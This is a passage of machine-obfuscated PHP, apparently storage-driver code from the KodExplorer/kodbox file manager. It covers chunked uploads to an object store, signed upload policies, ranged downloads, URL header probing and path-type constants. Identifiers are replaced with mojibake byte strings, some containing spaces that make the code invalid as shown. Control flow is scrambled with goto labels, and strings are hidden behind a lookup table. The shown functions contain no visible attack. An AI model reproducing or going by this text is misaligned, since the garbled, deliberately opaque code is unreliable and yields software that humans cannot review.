$Cµö‹ØÀì£ = false) { $f¯Öî¹õ¸ø =& $_SERVER[òÀöí]; $FÔ‘‚•—ìá = $b“œù™‹¥ˆ = array(); $this->fileList($F®¶áÔâ, $FÔ‘‚•—ìá, $b“œù™‹¥ˆ); foreach ($FÔ‘‚•—ìá as $a ×¸±æ¿’ => $AÊ¯óøå¹) { $FÔ‘‚•—ìá[$a ×¸±æ¿’] = $this->folderInfo($AÊ¯óøå¹, $Cµö‹ØÀì£); } foreach ($b“œù™‹¥ˆ as $a ×¸±æ¿’ => $AÊ¯óøå¹) { $b“œù™‹¥ˆ[$a ×¸±æ¿’] = $this->fileInfo($AÊ¯óøå¹[$f¯Öî¹õ¸ø[28]], $Cµö‹ØÀì£, $AÊ¯óøå¹); } return array($f¯Öî¹õ¸ø[74] => $FÔ‘‚•—ìá, $f¯Öî¹õ¸ø[73] => $b“œù™‹¥ˆ); } public function has($bİ×¹¡ƒ¥È, $BÔù®ĞÚÏ = false, $DŒğ½²ÙŸ = true) { goto dç•Ü©èÍ; eî»ÚËŒ‚…: $f‘å¾£³Ã = 0; $cò¶˜ª†“¨ = 0; $eçÀµ‹‚ŞŞ = rtrim($bİ×¹¡ƒ¥È, $ašìŞóœé [8]) . $ašìŞóœé [8]; goto FÍø±ª¦Ûœ; dç•Ü©èÍ: $ašìŞóœé  =& $_SERVER[òÀöí]; $A…Ìêô¬Úì = $ašìŞóœé [33]; $Fİë¾•øÇ¾ = 500; goto eî»ÚËŒ‚…; FÍø±ª¦Ûœ: while (!0) { check_abort(); $cì¹œÆ™™Œ = $this->listObjs($bİ×¹¡ƒ¥È, $A…Ìêô¬Úì, $Fİë¾•øÇ¾); if (!$cì¹œÆ™™Œ) { return !1; } $A…Ìêô¬Úì = isset($cì¹œÆ™™Œ[$ašìŞóœé [1320]]) ? $cì¹œÆ™™Œ[$ašìŞóœé [1320]] : $ašìŞóœé [33]; $BÉ½ŒßÇ‰ = isset($cì¹œÆ™™Œ[$ašìŞóœé [1321]]) ? $cì¹œÆ™™Œ[$ašìŞóœé [1321]] : array(); if (empty($BÉ½ŒßÇ‰)) { break; } $B½™Ø¡÷®™ = array_filter($BÉ½ŒßÇ‰, function ($F‘ùö¨’®) { $AÂ·ë¤¢– =& $_SERVER[òÀöí]; return $F‘ùö¨’®[$AÂ·ë¤¢–[29]] == $AÂ·ë¤¢–[76]; }); $fƒ‡©†Ó ö = count($BÉ½ŒßÇ‰); $B½™Ø¡÷®™ = count($B½™Ø¡÷®™); $EŒ˜øËÑĞ§ = $fƒ‡©†Ó ö - $B½™Ø¡÷®™; if ($BÔù®ĞÚÏ) { $cò¶˜ª†“¨ += $B½™Ø¡÷®™; $f‘å¾£³Ã += $EŒ˜øËÑĞ§; if ($fƒ‡©†Ó ö < $Fİë¾•øÇ¾) { break; } continue; } if ($DŒğ½²ÙŸ) { if ($EŒ˜øËÑĞ§) { return !0; } } else { if ($B½™Ø¡÷®™) { return !0; } } if ($fƒ‡©†Ó ö < $Fİë¾•øÇ¾) { break; } } if ($BÔù®ĞÚÏ) { return array($ašìŞóœé [201] => $f‘å¾£³Ã, $ašìŞóœé [202] => $cò¶˜ª†“¨); } return !1; goto B•ï—¦‰Óâ; B•ï—¦‰Óâ: } public function listAll($DÁÜæÜ•Œ) { goto CÉÁßîİöô; Bñ¾¸˜Ê»: return $this->listAllFiles($DÁÜæÜ•Œ, array_keys($eœ´æ¯½åë), $eœ´æ¯½åë); goto D°îÔ•ÃŠ ; CÉÁßîİöô: $c¢İ¢°Ûİ¶ =& $_SERVER[òÀöí]; $eÌ¾¬‚¬ñŸ = $bƒ·ª“×‹ª = array(); $this->fileList($DÁÜæÜ•Œ, $eÌ¾¬‚¬ñŸ, $bƒ·ª“×‹ª, !0); goto F×âäÜ»Ã²; F×âäÜ»Ã²: $eœ´æ¯½åë = array(); foreach ($bƒ·ª“×‹ª as $D…ïÒğ¶„) { $eœ´æ¯½åë[$D…ïÒğ¶„[$c¢İ¢°Ûİ¶[28]]] = $D…ïÒğ¶„[$c¢İ¢°Ûİ¶[77]]; } foreach ($eÌ¾¬‚¬ñŸ as $D…ïÒğ¶„) { if (is_string($D…ïÒğ¶„)) { $eœ´æ¯½åë[$D…ïÒğ¶„] = 0; } } goto Bñ¾¸˜Ê»; D°îÔ•ÃŠ : } public function canRead($Dæ•ò‚ÓÈ¥) { return $this->exist($Dæ•ò‚ÓÈ¥) ? !0 : !1; } public function canWrite($c“õˆƒß) { return $this->exist($c“õˆƒß) ? !0 : !1; } public function getContent($b™ã‚„äãÕ) { return $this->fileSubstr($b™ã‚„äãÕ, 0, -1); } public function setContent($dÊÁ—Ó‰™, $dŠ´‚ŠàïÑ = '') { $f‚™Ü¬„â´ =& $_SERVER[òÀöí]; if (!$dŠ´‚ŠàïÑ) { $fäğ¦ä÷ƒ“ = $this->ussRequest($dÊÁ—Ó‰™, $f‚™Ü¬„â´[222]); return $fäğ¦ä÷ƒ“[$f‚™Ü¬„â´[1064]]; } $dÜ‡±ó¹‚Ó = $this->tempFile($this->pathThis($dÊÁ—Ó‰™)); file_put_contents($dÜ‡±ó¹‚Ó, $dŠ´‚ŠàïÑ); if ($this->upload($dÊÁ—Ó‰™, $dÜ‡±ó¹‚Ó)) { $this->tempFileRemve($dÜ‡±ó¹‚Ó); return !0; } return !1; } public function fileSubstr($AÄ÷£éå“î, $D¼ŒÚğÁ¡, $AÅİ¹ˆ†‹) { $aˆ¡„¼»†Ã =& $_SERVER[òÀöí]; if (!($e™œÅ£å‘ = $this->link($AÄ÷£éå“î))) { return !1; } $D±—Ñ®ÔÚ„ = !1; if ($AÅİ¹ˆ†‹ > 0) { $Aòã½‹Ó×® = $D¼ŒÚğÁ¡ + $AÅİ¹ˆ†‹ - 1; $D±—Ñ®ÔÚ„ = array($aˆ¡„¼»†Ã[1283] . $D¼ŒÚğÁ¡ . $aˆ¡„¼»†Ã[429] . $Aòã½‹Ó×®); } $EÓ‚Ä‹§òÛ = url_request($e™œÅ£å‘, $aˆ¡„¼»†Ã[226], !1, $D±—Ñ®ÔÚ„); return $EÓ‚Ä‹§òÛ[$aˆ¡„¼»†Ã[708]] ? $EÓ‚Ä‹§òÛ[$aˆ¡„¼»†Ã[1066]] : !1; } public function upload($Aƒ‹ê¥¡¼Ü, $Dò İÒƒÔß, $bñ„à‰‚ò» = false, $eÍâÚÜõ = REPEAT_REPLACE) { goto BÜÇç°¹‘; eïÂåŒÊØ: $EòÓ‹Â‚‚ = $this->ussRequest($Aƒ‹ê¥¡¼Ü, $E»ÁÀÜ‚†[224], !1, $aàÙìĞ°™); return $EòÓ‹Â‚‚[$E»ÁÀÜ‚†[1064]] ? $this->getPathOuter($B·á©“²¡›) : !1; goto cÄÜº—Îç‰; b¡ä´Ğ«Ş­: $bô»Ğå¥· = $e”íÍÀé[$E»ÁÀÜ‚†[1328]]; $a«„¼‹©È° = fopen($Dò İÒƒÔß, $E»ÁÀÜ‚†[1233]); if (!$a«„¼‹©È°) { return !1; } goto Aò‹É¼®Ç›; BÜÇç°¹‘: $E»ÁÀÜ‚† =& $_SERVER[òÀöí]; $C’â™İŸèÖ = IO::size($Dò İÒƒÔß); if ($C’â™İŸèÖ <= 1024 * 1024 * 200) { $a×´†œ¨• = array($E»ÁÀÜ‚†[1323] . $Dò İÒƒÔß); $EòÓ‹Â‚‚ = $this->ussRequest($Aƒ‹ê¥¡¼Ü, $E»ÁÀÜ‚†[224], $a×´†œ¨•); return $EòÓ‹Â‚‚[$E»ÁÀÜ‚†[1064]] ? $this->getPathOuter($Aƒ‹ê¥¡¼Ü) : !1; } goto Bùî™Õ¯Ğ; d«ß¿œŠÜ : if (!$EòÓ‹Â‚‚[$E»ÁÀÜ‚†[1064]]) { return !1; } $e”íÍÀé = $EòÓ‹Â‚‚[$E»ÁÀÜ‚†[1066]]; $A›è×ˆ‹–» = 0; goto b¡ä´Ğ«Ş­; Aò‹É¼®Ç›: do { $BÍÛšÏé˜ = $e”íÍÀé[$E»ÁÀÜ‚†[1329]]; fseek_64($a«„¼‹©È°, $A›è×ˆ‹–»); $AÜ¶¡›Œ” = fread($a«„¼‹©È°, $BÍÛšÏé˜); $f‚à•àÜÆ = 0; do { $f‚à•àÜÆ++; $e”íÍÀé = $this->uploadPart($Aƒ‹ê¥¡¼Ü, $e”íÍÀé, $AÜ¶¡›Œ”); } while (!$e”íÍÀé && $f‚à•àÜÆ < 3); if (!$e”íÍÀé) { return !1; } $bô»Ğå¥· = $e”íÍÀé[$E»ÁÀÜ‚†[1328]]; $A›è×ˆ‹–» += $BÍÛšÏé˜; } while ($bô»Ğå¥· != -1); fclose($a«„¼‹©È°); $aàÙìĞ°™ = array($E»ÁÀÜ‚†[1330], $E»ÁÀÜ‚†[1331] . $e”íÍÀé[$E»ÁÀÜ‚†[1332]], $E»ÁÀÜ‚†[1326]); goto eïÂåŒÊØ; Bùî™Õ¯Ğ: $BÎğ¦Ó•©¶ = 1024 * 1024 * 10; $aàÙìĞ°™ = array($E»ÁÀÜ‚†[1324], $E»ÁÀÜ‚†[1325] . $C’â™İŸèÖ, $E»ÁÀÜ‚†[1326], $E»ÁÀÜ‚†[1327] . $BÎğ¦Ó•©¶); $EòÓ‹Â‚‚ = $this->ussRequest($Aƒ‹ê¥¡¼Ü, $E»ÁÀÜ‚†[224], !1, $aàÙìĞ°™); goto d«ß¿œŠÜ ; cÄÜº—Îç‰: } private function uploadPart($Cêõ‡Ù¿‹, $FåöÛ§ìíš, &$BˆÛ¯½ê‡Á) { $c¶†ô¿¶ñƒ =& $_SERVER[òÀöí]; $FêíóïÌ¦¾ = array($c¶†ô¿¶ñƒ[1333], $c¶†ô¿¶ñƒ[1331] . $FåöÛ§ìíš[$c¶†ô¿¶ñƒ[1332]], $c¶†ô¿¶ñƒ[1334] . $FåöÛ§ìíš[$c¶†ô¿¶ñƒ[1328]], $c¶†ô¿¶ñƒ[140] . $FåöÛ§ìíš[$c¶†ô¿¶ñƒ[1329]]); $e¦òÂÀÍ¸« = $this->ussRequest($Cêõ‡Ù¿‹, $c¶†ô¿¶ñƒ[224], $BˆÛ¯½ê‡Á, $FêíóïÌ¦¾); return !$e¦òÂÀÍ¸«[$c¶†ô¿¶ñƒ[1064]] ? $e¦òÂÀÍ¸«[$c¶†ô¿¶ñƒ[1064]] : $e¦òÂÀÍ¸«[$c¶†ô¿¶ñƒ[1066]]; } public function uploadFormData($EõÅ‹ßš, $BÅˆ³£×™ù = 3600) { return $this->uploadPolicy($EõÅ‹ßš, $BÅˆ³£×™ù); } public function multiUploadFormData($a¯Œ¢Åá÷æ, $c‚Åšñ¤É± = 3600) { $a¯¨´ƒ°… =& $_SERVER[òÀöí]; $d‡²Ÿ×ÛĞæ = (int) $GLOBALS[$a¯¨´ƒ°…[7]][$a¯¨´ƒ°…[77]]; return $this->uploadPolicy($a¯Œ¢Åá÷æ, $c‚Åšñ¤É±, $d‡²Ÿ×ÛĞæ); } private function uploadPolicy($dà÷¬“£á», $c’±ªŠó ‚ = 3600, $D½ŸË‡½ = 0) { goto BÎœ£ÃÀ; b¨ÛÆøîº: $EÀ”•Ùä¾÷ = base64_encode(hash_hmac($c³ªˆØİì[1305], "\120\x4f\x53\124\46{$f•ÄŒÒà²á}\46{$eºˆ´»˜—ß}\46{$D›‹½Ó²æ}", md5("{$this->userpass}"), !0)); $E²‚Ú›Æ = array($c³ªˆØİì[1176] => $D›‹½Ó²æ, $c³ªˆØİì[1339] => "\125\120\x59\x55\116\40{$this->username}\72{$EÀ”•Ùä¾÷}", $c³ªˆØİì[175] => $this->endpoint . $f•ÄŒÒà²á); return $E²‚Ú›Æ; goto CƒÑÔŠó‚ ; AÙ—ŒÆ±«: $aê¤ÂÍ©šæ = array($c³ªˆØİì[1335] => $this->bucket, $c³ªˆØİì[1336] => $dà÷¬“£á», $c³ªˆØİì[1337] => time() + $c’±ªŠó ‚, $c³ªˆØİì[1338] => $eºˆ´»˜—ß); if ($D½ŸË‡½) { $aê¤ÂÍ©šæ[$c³ªˆØİì[1249]] = $D½ŸË‡½; } $D›‹½Ó²æ = base64_encode(json_encode($aê¤ÂÍ©šæ)); goto b¨ÛÆøîº; BÎœ£ÃÀ: $c³ªˆØİì =& $_SERVER[òÀöí]; $f•ÄŒÒà²á = $c³ªˆØİì[8] . $this->bucket; $eºˆ´»˜—ß = gmdate($c³ªˆØİì[1270]); goto AÙ—ŒÆ±«; CƒÑÔŠó‚ : } public function download($c›’ó—ÆËô, $CŒÑÔÎ½Ôé) { goto f°ëÙòİŒ; Bö¨®‘ÈäŸ: fclose($Eïé¶ïÏÏÁ); return $CŒÑÔÎ½Ôé; goto cã˜›Ø”ò×; f°ëÙòİŒ: $D ÔÛÌÊä = IO::getPathInner(IO::mkfile($CŒÑÔÎ½Ôé)); if (!($e†ù‰Ÿ…„ = $this->link($c›’ó—ÆËô))) { return !1; } $F­”‘Ú„ = 0; goto C£á¼Œòƒá; C£á¼Œòƒá: $d³çöÇöÉ÷ = 1024 * 200; $Eïé¶ïÏÏÁ = fopen($D ÔÛÌÊä, $_SERVER[òÀöí][1289]); while (!0) { $AÅ§àÌæ¢ = $this->fileSubstr($c›’ó—ÆËô, $F­”‘Ú„, $d³çöÇöÉ÷); if ($AÅ§àÌæ¢ === !1) { return !1; } fwrite($Eïé¶ïÏÏÁ, $AÅ§àÌæ¢); $F­”‘Ú„ += $d³çöÇöÉ÷; if (strlen($AÅ§àÌæ¢) < $d³çöÇöÉ÷) { break; } } goto Bö¨®‘ÈäŸ; cã˜›Ø”ò×: } public function link($Fô‚…¯Šˆ‹, $C‹¢ĞìÒ×Ö = array()) { $E—éÍóªõ =& $_SERVER[òÀöí]; $Fô‚…¯Šˆ‹ = trim($Fô‚…¯Šˆ‹, $E—éÍóªõ[8]); if (!empty($this->token)) { $D›½Ï¢´‡Ş = strtotime(date($E—éÍóªõ[1340])); $fÂé¯§—õ = substr(md5($this->token . $E—éÍóªõ[280] . $D›½Ï¢´‡Ş . $E—éÍóªõ[1341] . $Fô‚…¯Šˆ‹), 12, 8) . $D›½Ï¢´‡Ş; $C‹¢ĞìÒ×Ö[] = $E—éÍóªõ[1342] . $fÂé¯§—õ; } $Fåã– Ï = !empty($C‹¢ĞìÒ×Ö) ? $E—éÍóªõ[69] . implode($E—éÍóªõ[280], $C‹¢ĞìÒ×Ö) : $E—éÍóªõ[33]; return $this->getHost() . $E—éÍóªõ[8] . $Fô‚…¯Šˆ‹ . $Fåã– Ï; } public function fileOut($Eë¦™–†à, $aôÚàÒ®Ë = false, $fê¬ä˜Íä = false, $b‚ñ¨èˆ´Œ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Eë¦™–†à, $aôÚàÒ®Ë, $fê¬ä˜Íä, $b‚ñ¨èˆ´Œ); } if (!$fê¬ä˜Íä) { $fê¬ä˜Íä = $this->pathThis($Eë¦™–†à); } $bÑòùæÛ« = $aôÚàÒ®Ë ? array($_SERVER[òÀöí][1343] . rawurlencode($fê¬ä˜Íä)) : array(); $fË‡»¸ù®· = $this->link($Eë¦™–†à, $bÑòùæÛ«); $this->fileOutLink($fË‡»¸ù®·); } public function fileOutServer($B†É“á¢Î³, $c‹™¿ƒ‰®¶ = false, $dÅŒ½‰˜Ì = false, $F¿®¨ï«… = '') { parent::fileOut($B†É“á¢Î³, $c‹™¿ƒ‰®¶, $dÅŒ½‰˜Ì, $F¿®¨ï«…); } public function fileOutImage($AÜ³•³ºÕæ, $bÁ¬¤æˆÀÇ = 250) { $eÒéÈ²÷» = $this->link($AÜ³•³ºÕæ . $_SERVER[òÀöí][1344] . $bÁ¬¤æˆÀÇ); $this->fileOutLink($eÒéÈ²÷»); } public function fileOutImageServer($Cåè§î, $d©„÷ØÖ‚ = 250) { parent::fileOutImage($Cåè§î, $d©„÷ØÖ‚); } public function hashMd5($d„“¬‹˜ó‡) { $Cê’Ëºùí¹ =& $_SERVER[òÀöí]; $b›²ŒÈ•¥ï = $this->_objectMeta($d„“¬‹˜ó‡); return isset($b›²ŒÈ•¥ï[$Cê’Ëºùí¹[206]]) ? $b›²ŒÈ•¥ï[$Cê’Ëºùí¹[206]] : !1; } public function size($e…ÓÎ¦²„ø) { $AÛ§¯ó”‚Ï = $this->objectMeta($e…ÓÎ¦²„ø); return $AÛ§¯ó”‚Ï ? $AÛ§¯ó”‚Ï[$_SERVER[òÀöí][77]] : 0; } public function info($eƒÙó™”Óö) { if ($this->isFolder($eƒÙó™”Óö)) { return $this->folderInfo($eƒÙó™”Óö); } else { if ($this->isFile($eƒÙó™”Óö)) { return $this->fileInfo($eƒÙó™”Óö); } } return !1; } public function exist($FÏ½§‘ïÛ) { return $this->isFile($FÏ½§‘ïÛ) || $this->isFolder($FÏ½§‘ïÛ); } public function isFile($Fô¢›òóî) { return !$this->isFolder($Fô¢›òóî) && $this->objectMeta($Fô¢›òóî); } public function isFolder($FÏôÉèô“ø) { return $this->cacheMethod($_SERVER[òÀöí][197], $FÏôÉèô“ø); } protected function objectMeta($d¬Ã‚ŸŠ³) { return $this->cacheMethod($_SERVER[òÀöí][198], $d¬Ã‚ŸŠ³); } protected function _objectMeta($cĞ Šîäå) { goto FÚÔßğ˜…¢; eî¸³Ÿè÷: $E‡ùÎ¿ö±‰ = array($FœÛØ‡ §Ö[29] => isset($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1346]]) ? $DŠåè•øÄŞ[$FœÛØ‡ §Ö[1346]] : null, $FœÛØ‡ §Ö[77] => isset($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1347]]) ? $DŠåè•øÄŞ[$FœÛØ‡ §Ö[1347]] : null, $FœÛØ‡ §Ö[206] => isset($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1348]]) ? $DŠåè•øÄŞ[$FœÛØ‡ §Ö[1348]] : null, $FœÛØ‡ §Ö[1315] => isset($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1349]]) ? $DŠåè•øÄŞ[$FœÛØ‡ §Ö[1349]] : null); $E‡ùÎ¿ö±‰[$FœÛØ‡ §Ö[1316]] = isset($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1350]]) ? strtotime($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1350]]) : $E‡ùÎ¿ö±‰[$FœÛØ‡ §Ö[1315]]; return $E‡ùÎ¿ö±‰; goto BåŒÙ³àå…; AË¸°¾±Îß: if (!$Eé¨äæÏˆ‰[$FœÛØ‡ §Ö[1064]]) { return null; } $DŠåè•øÄŞ = isset($Eé¨äæÏˆ‰[$FœÛØ‡ §Ö[1066]]) ? $Eé¨äæÏˆ‰[$FœÛØ‡ §Ö[1066]] : array(); if (!isset($DŠåè•øÄŞ[$FœÛØ‡ §Ö[1346]])) { return null; } goto eî¸³Ÿè÷; FÚÔßğ˜…¢: $FœÛØ‡ §Ö =& $_SERVER[òÀöí]; if ($cĞ Šîäå == $FœÛØ‡ §Ö[33] || $cĞ Šîäå == $FœÛØ‡ §Ö[8]) { return array(); } $Eé¨äæÏˆ‰ = $this->ussRequest($cĞ Šîäå, $FœÛØ‡ §Ö[1345]); goto AË¸°¾±Îß; BåŒÙ³àå…: } protected function _isFolder($aí×†Ùæ) { $FÑí¨Šõ =& $_SERVER[òÀöí]; if ($aí×†Ùæ == $FÑí¨Šõ[33] || $aí×†Ùæ == $FÑí¨Šõ[8]) { return !0; } $FÄá…“å÷š = $this->_objectMeta($aí×†Ùæ); return isset($FÄá…“å÷š[$FÑí¨Šõ[29]]) && $FÄá…“å÷š[$FÑí¨Šõ[29]] == $FÑí¨Šõ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($aäÊƒ†ïÚˆ = false) { } public function exist($d’Ç•¶ÄŞç) { $bÖÈ°Ê¥³ = $this->info($d’Ç•¶ÄŞç); return $bÖÈ°Ê¥³[$_SERVER[òÀöí][193]]; } public function isFile($déÑ»•¶âó) { $A™‘áÎ§ƒá = $this->info($déÑ»•¶âó); return $A™‘áÎ§ƒá[$_SERVER[òÀöí][193]]; } public function isFolder($bÌùç·Ô¾) { return !1; } public function size($DÉà•’˜) { $FÒ×ñŸÀà = $this->info($DÉà•’˜); return $FÒ×ñŸÀà[$_SERVER[òÀöí][77]]; } public function info($AæÀÓÏ•™¾) { return $this->infoParse($AæÀÓÏ•™¾); } public function infoAuth($Eå¹ùöˆ â) { return $this->infoParse($Eå¹ùöˆ â); } public function infoWithChildren($A òø•ì»œ) { return $this->infoParse($A òø•ì»œ); } public function infoFull($cÂ²„‰œÃ) { return $this->infoParse($cÂ²„‰œÃ); } private function infoParse($aÀñİè‡ë) { $b¼‚Û¤Úâ =& $_SERVER[òÀöí]; $dÙ™á†Ø˜ = $this->header($aÀñİè‡ë); if (!$dÙ™á†Ø˜ || !$dÙ™á†Ø˜[$b¼‚Û¤Úâ[708]]) { return !1; } $c•š¤Î§‹µ = _get($dÙ™á†Ø˜, $b¼‚Û¤Úâ[333], 0); $CËòÍ¤½æ’ = array($b¼‚Û¤Úâ[28] => $dÙ™á†Ø˜[$b¼‚Û¤Úâ[28]], $b¼‚Û¤Úâ[75] => $aÀñİè‡ë, $b¼‚Û¤Úâ[29] => $b¼‚Û¤Úâ[173], $b¼‚Û¤Úâ[77] => intval($c•š¤Î§‹µ), $b¼‚Û¤Úâ[167] => get_path_ext($dÙ™á†Ø˜[$b¼‚Û¤Úâ[28]]), $b¼‚Û¤Úâ[1230] => $c•š¤Î§‹µ > 0 && $dÙ™á†Ø˜[$b¼‚Û¤Úâ[1351]], $b¼‚Û¤Úâ[1231] => !1); return $CËòÍ¤½æ’; } private function header($fš³÷ºŠøÊ) { goto dÆ÷¹¸ÍÂµ; b¢‡ƒ³÷˜Ş: return self::$_cacheHeader[$fš³÷ºŠøÊ]; goto aôÏ†ø±„¡; dÆ÷¹¸ÍÂµ: $d‚¯‘™á±é =& $_SERVER[òÀöí]; if (isset(self::$_cacheHeader[$fš³÷ºŠøÊ])) { return self::$_cacheHeader[$fš³÷ºŠøÊ]; } $AŒƒæ¸½ğ¼ = isset($GLOBALS[$d‚¯‘™á±é[1352]]) ? $GLOBALS[$d‚¯‘™á±é[1352]] : !1; goto C”»ï¾³ä; C”»ï¾³ä: $GLOBALS[$d‚¯‘™á±é[1352]] = !0; self::$_cacheHeader[$fš³÷ºŠøÊ] = url_header($fš³÷ºŠøÊ); $GLOBALS[$d‚¯‘™á±é[1352]] = $AŒƒæ¸½ğ¼; goto b¢‡ƒ³÷˜Ş; aôÏ†ø±„¡: } public function hashSimple($CÖÙÅÕñ˜, $A îËÒ¹ = false) { goto Fº­ˆöùÔ¡; Fº­ˆöùÔ¡: $AÂ‡ÆÄ±Õ‰ =& $_SERVER[òÀöí]; $AåŸÔÆâÏ” = $this->info($CÖÙÅÕñ˜); if (!$AåŸÔÆâÏ” || !$AåŸÔÆâÏ”[$AÂ‡ÆÄ±Õ‰[193]]) { return !1; } goto C¿ç„–÷Ì¨; Eë²©ÏæÑ: if ($C’ßÅ°†Œ <= $e¼‹™‡»‹‰ * $c¢ŒÃ†²¥õ) { return md5($this->fileSubstr($CÖÙÅÕñ˜, 0, $C’ßÅ°†Œ)) . $C’ßÅ°†Œ; } $cªŠÑ¼§­ = intval($C’ßÅ°†Œ / $c¢ŒÃ†²¥õ); $c·«ˆÈôó² = $AÂ‡ÆÄ±Õ‰[33]; goto C¬·Šëí¬ø; C¬·Šëí¬ø: $BÓ†Ö ˜ßó = timeFloat(); $B’åÑİßŸ = 15; for ($D¶ïÇîĞ¡ = 0; $D¶ïÇîĞ¡ < $c¢ŒÃ†²¥õ; $D¶ïÇîĞ¡++) { if (timeFloat() - $BÓ†Ö ˜ßó > $B’åÑİßŸ) { return !1; } $DÛìŒñó’Ÿ = $this->fileSubstr($CÖÙÅÕñ˜, $cªŠÑ¼§­ * $D¶ïÇîĞ¡, $e¼‹™‡»‹‰); if (!$DÛìŒñó’Ÿ) { return !1; } $c·«ˆÈôó² .= $DÛìŒñó’Ÿ; } goto f­—Øƒƒ·æ; f­—Øƒƒ·æ: $c·«ˆÈôó² .= $this->fileSubstr($CÖÙÅÕñ˜, $C’ßÅ°†Œ - $e¼‹™‡»‹‰, $e¼‹™‡»‹‰); return md5($c·«ˆÈôó²) . $C’ßÅ°†Œ; goto AËº•ä”¹˜; C¿ç„–÷Ì¨: $C’ßÅ°†Œ = $AåŸÔÆâÏ”[$AÂ‡ÆÄ±Õ‰[77]]; $e¼‹™‡»‹‰ = 200; $c¢ŒÃ†²¥õ = 50; goto Eë²©ÏæÑ; AËº•ä”¹˜: } public function getContent($Dš‚Ç¶‹¯Ò) { return $this->fileSubstr($Dš‚Ç¶‹¯Ò); } public function fileSubstr($Fê¾á–À­, $D‡¤Ù«¯ = 0, $CÒÄë¨Öçµ = -1) { goto b„äƒší; b„äƒší: $fÜ­£“ó§ =& $_SERVER[òÀöí]; $EØÌ‰ÂÆ˜À = $this->info($Fê¾á–À­); if (!$EØÌ‰ÂÆ˜À || !$EØÌ‰ÂÆ˜À[$fÜ­£“ó§[193]] && $EØÌ‰ÂÆ˜À[$fÜ­£“ó§[77]] > 1024 * 1024 * 10) { return !1; } goto eåñ®Üªê; c—ò·Êğ×: $A×¹ÈÎ Í = url_request($Fê¾á–À­, $fÜ­£“ó§[226], !1, $Cã¯ùÁ ‘‚, !1, !1, 1); return $A×¹ÈÎ Í[$fÜ­£“ó§[1066]] ? $A×¹ÈÎ Í[$fÜ­£“ó§[1066]] : $fÜ­£“ó§[33]; goto A†Æå® ²; eåñ®Üªê: if ($CÒÄë¨Öçµ === -1) { $CÒÄë¨Öçµ = $EØÌ‰ÂÆ˜À[$fÜ­£“ó§[77]]; } if ($CÒÄë¨Öçµ == 0) { return $fÜ­£“ó§[33]; } $Cã¯ùÁ ‘‚ = array($fÜ­£“ó§[1353] . $D‡¤Ù«¯ . $fÜ­£“ó§[734] . ($D‡¤Ù«¯ + $CÒÄë¨Öçµ - 1)); goto c—ò·Êğ×; A†Æå® ²: } public function download($eçÔØ± İ™, $e‘½•À) { Downloader::start($eçÔØ± İ™, $e‘½•À); return $e‘½•À; } } goto Fœëœ ŠÊˆ; C³íˆÌéÃì: class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\145\x63\x79\143\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\151\x6c\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\162\x46\151\x6c\145\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\160\122\157\157\164\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\162\x53\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\x53\150\x61\x72\145\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\x65\124\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\145\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\145\111\x74\x65\155\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\157\x63\153\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\122\x65\156\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\x65\162\x7d"; public static function typeList() { $f™“ğ´¢¢× =& $_SERVER[òÀöí]; return array($f™“ğ´¢¢×[1116] => self::KOD_SOURCE, $f™“ğ´¢¢×[1117] => self::KOD_USER_RECYCLE, $f™“ğ´¢¢×[1118] => self::KOD_USER_FAV, $f™“ğ´¢¢×[1119] => self::KOD_USER_FILE_TAG, $f™“ğ´¢¢×[1120] => self::KOD_USER_FILE_TYPE, $f™“ğ´¢¢×[1121] => self::KOD_GROUP_ROOT_SELF, $f™“ğ´¢¢×[1122] => self::KOD_USER_SHARE, $f™“ğ´¢¢×[1123] => self::KOD_USER_SHARE_LINK, $f™“ğ´¢¢×[1124] => self::KOD_USER_SHARE_TO_ME, $f™“ğ´¢¢×[1125] => self::KOD_SHARE_ITEM, $f™“ğ´¢¢×[1126] => self::KOD_SHARE_LINK, $f™“ğ´¢¢×[1127] => self::KOD_SEARCH, $f™“ğ´¢¢×[1128] => self::KOD_BLOCK, $f™“ğ´¢¢×[1129] => self::KOD_IO, $f™“ğ´¢¢×[1130] => self::KOD_USER_RECENT, $f™“ğ´¢¢×[1131] => self::KOD_USER_DRIVER); } public static function parse($Bèƒ¡’ôö) { goto d‚áŸ®„ö; Bâ»ëáƒìø: $EÆÂ³îÅÈÅ = array($Dš§Ù¢–Ÿğ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $dğèÒƒºº[$Dš§Ù¢–Ÿğ[1097]] = in_array($dğèÒƒºº[$Dš§Ù¢–Ÿğ[29]], $EÆÂ³îÅÈÅ); return $dğèÒƒºº; goto e¾Şó‡™; F…•–İ¿Ø”: preg_match($Dš§Ù¢–Ÿğ[1132], $Bèƒ¡’ôö, $Eœ›ñÑŞ£Š); $dğèÒƒºº = array($Dš§Ù¢–Ÿğ[406] => !1, $Dš§Ù¢–Ÿğ[1133] => !1, $Dš§Ù¢–Ÿğ[403] => !1, $Dš§Ù¢–Ÿğ[75] => $Bèƒ¡’ôö, 